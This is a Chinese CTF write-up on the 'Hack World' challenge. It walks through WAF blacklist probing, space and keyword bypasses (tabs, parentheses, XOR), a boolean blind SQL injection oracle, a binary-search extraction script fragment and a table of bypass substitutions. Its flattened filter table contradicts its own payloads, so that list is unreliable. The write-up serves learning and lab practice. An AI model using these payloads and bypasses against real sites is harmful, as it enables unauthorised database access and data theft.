Web 安全：SQL 盲注与 WAF 绕过解题全流程（Hack World 实战）

Web 安全 2026-09-01 3059 字 约 8 分钟

来源：NSSCTF Hack World 实战（与 BUUCTF 同源题），2026-09-01 全流程手打复现
定位：WAF 黑名单 + 布尔盲注，CTF Web 高频题型；"如何绕过过滤/盲注怎么写脚本"面试必问
实战场景：任何拦 and/or/空格的注入点，任何只有"真/假"两种回显的页面

一、题型识别与环境侦察

题面特征：Hack World，提示"flag 在表 flag 的列 flag"，POST 一个 id 参数。

侦察动作（按顺序做，全都只发几次请求）：

输入 返回 结论
id=1 Hello, glzjin wants a girlfriend. 正常响应基线
id=2 另一句话 说明每行有不同回显（回显位 = id 值）
id=0 Error Occured When Fetch Result. 查不到 → 报错，布尔盲注的"假"响应
id=1' bool(false) SQL 语法错误 → 数字型注入（无引号包裹，不用闭合）
id=1 or 1=1 SQL Injection Checked. 存在 WAF

注入类型判断口诀：1' 报语法错误 → 数字型；1' 报错/正常闭合 → 字符型；回显只有两种 → 盲注路线。

注意：布尔盲注成立的前提是存在两个稳定可区分的响应。本题就是 Hello（真） vs Error（假）。

二、WAF 过滤探测（全流程最核心，坑最多）

方法：构造"数字 + 关键字 + 数字"的探测 payload 逐个提交，靠响应三分类定位过滤规则：

  • SQL Injection Checked. → 关键字被拦（WAF）
  • bool(false)（语法错误） → 关键字放行（只是语法写错）
  • 正常/Hello/Error → 放行

坑 1：空格才是元凶（本例最大坑）
1 length 1 被拦，第一反应以为是 length 被过滤——其实 length、database 全都放行，被拦是因为空格本身在黑名单里。用制表符 \t 代替空格重测：1\tlength\t1 → 放行。→ 探测时所有分隔符统一换 \t，把"空格的影响"和"关键字的影响"分开。

坑 2：黑名单是子串匹配
WAF 拦 or，于是 xor、ord、floor、order（都含 or 子串）全部连带被拦；而 from（f-r-o-m）恰好不含 or，正常放行。→ 构造 payload 时检查整串里有没有被拦子串。

坑 3：括号代替空格
过滤只针对 0x20 空格，制表符 \t、换行 \n、括号都放行 → select(flag)from(flag) 全程无空格，合法可执行。

本题最终过滤清单（实战结论）：

被拦 放行
空格 0x20、+ - * & " # -- /* \t、^ = > < , ' ( ) % /
关键字子串：or and xor union group limit insert update delete ord floor rand select from where substr ascii length database concat 等

三、构造异或布尔盲注 oracle

and/or 被拦 → 用异或 ^ 做布尔运算（XOR 真值表中 1^1=0、1^0=1，天然是"条件"载体）：

0^(条件)   → 条件真：0^1 = 1 → id=1 有数据 → 回显 Hello
            条件假：0^0 = 0 → 查无此行 → 回显 Error

先花一次请求验证查询链路通不通（题目已经告诉你表和列，直接查，省掉枚举 information_schema）：

0^(select(2)from(flag))   → 若回显 id=2 那句话 → select/from/flag表/flag列 全部可用 ✓

表达式模板（全程无空格、无引号）：

  • 长度：0^((length((select(flag)from(flag)))>N))
  • 字符：0^((ascii(substr((select(flag)from(flag)),i,1))>M))（ASCII 与数字比较，避开引号字符串）

四、自动化二分盲注（写脚本）

线上一秒一发不现实，必须脚本化。核心思路：把"数据库内容"变成"一个个布尔判断题"，二分逼近。

# 核心循环：长度二分
lo, hi = 1, 128
while lo < hi:
    mid = (lo + hi) // 2
    if post("0^((length((select(flag)from(flag)))>%d))" % mid): lo = mid + 1
    else: hi = mid
# 字符二分：ASCII 32~127，每字符约 7 次请求

# 三件套：真/假响应关键词判定 + 超时重试 + 遇 '}' 提前终止

请求量估算（面试常问）：长度 ~7 次 + 每字符 ~7 次 → 44 字符 ≈ 350 次请求 ≈ 2~3 分钟；若线性扫描要 4000+ 次 → 这就是必须二分的理由。

完整可直接改的模板脚本：~/\ctf\sqli_blind_template.py（改 CONFIG 区即可套用新题）。

五、绕过招式扩展（同类题变种）

被拦的东西 替代方案
and / or ^ 异或、| 位或、&&/||（若未拦）
空格 \t、\n、括号 ()、注释符（若未拦 /*）
substr mid()、substring()、left()/right() 组合
ascii ord()、hex() 取首字符
= > / < 二分照样跑（oracle 换成大小判断）
, substr(x from 1 for 1) 的 from-for 语法
引号 ' 十六进制字符串 0x...(hex)
select/from 内联注释 sel/**/ect（前提 /* 未被过滤）

工具边界：sqlmap 面对定制 WAF（空格+子串黑名单）默认模板几乎必被拦或慢死，--tamper 空间有限；手工探测清单 + 自写脚本反而稳定可控。但先懂手工流程，sqlmap 输出才读得懂。

六、面试速答卡

  • 布尔盲注三件套：length() 猜长度 → substr() 取位 → ascii() 转数值二分
  • 异或为什么能绕过 and/or：0^(条件)，条件真 → 1，假 → 0；^ 不在黑名单里
  • 空格被拦怎么办：制表符/换行/括号/注释符，探测时先用 \t 重测区分"空格"与"关键字"的过滤
  • 子串黑名单的坑：拦 or 连带 xor/ord/floor/order，检查 payload 全串无被拦子串
  • 盲注请求量怎么估：长度 ~7 次 + 每字符 ~7 次（二分），线性扫描慢 10 倍以上
  • 数字型 vs 字符型：1' 语法错误 = 数字型（无引号包裹）；需闭合引号 = 字符型
  • 最快验证查询链路：0^(select(常量)from(目标表)) 回显对应 id 即通
